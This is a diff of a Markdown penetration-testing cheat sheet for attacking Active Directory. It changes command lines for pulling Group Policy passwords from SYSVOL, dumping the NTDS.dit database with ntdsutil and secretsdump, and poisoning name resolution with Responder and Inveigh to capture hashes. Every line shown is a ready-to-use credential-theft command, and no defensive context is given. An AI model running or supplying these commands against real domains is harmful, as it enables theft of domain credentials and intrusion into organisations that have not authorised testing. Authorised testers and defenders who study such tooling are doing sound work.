@@ -225,7 +225,7 @@
 * CLI
   * `findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml`
 * Impacket
-  * `Get-GPPPassword.py <domain>/<user>:<pass> -dc-ip <ip>`
+  * `Get-GPPPassword.py <domain>/<user>:<pass>@<target> -dc-ip <ip>`
 
 
 ## LSASS parsing
@@ -399,8 +399,8 @@
    * `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
    * `Compress-Archive -Path C:\Temp\* -DestinationPath C:\Temp\dump.zip`
 * SecretsDump
-   * `secretsdump.py <domain>/<user>:<pass>@<target> -just-dc -outputfile dump`
-   * `secretsdump.exe <domain>/<user>:<pass>@<target> -just-dc -outputfile dump`
+   * `secretsdump.py <domain>/<user>:<pass>@<target> -outputfile dump`
+   * `secretsdump.exe <domain>/<user>:<pass>@<target> -outputfile dump`
 
 
 ## SecretsDump (local)
@@ -444,7 +444,7 @@
 ## Responder
 
 * [Responder](https://github.com/lgandx/Responder)
-   * `responder -I eth0 -wfd`
+   * `responder -I eth0 -wd`
 * [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
    * `Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]`
 * [Inveigh](https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1)
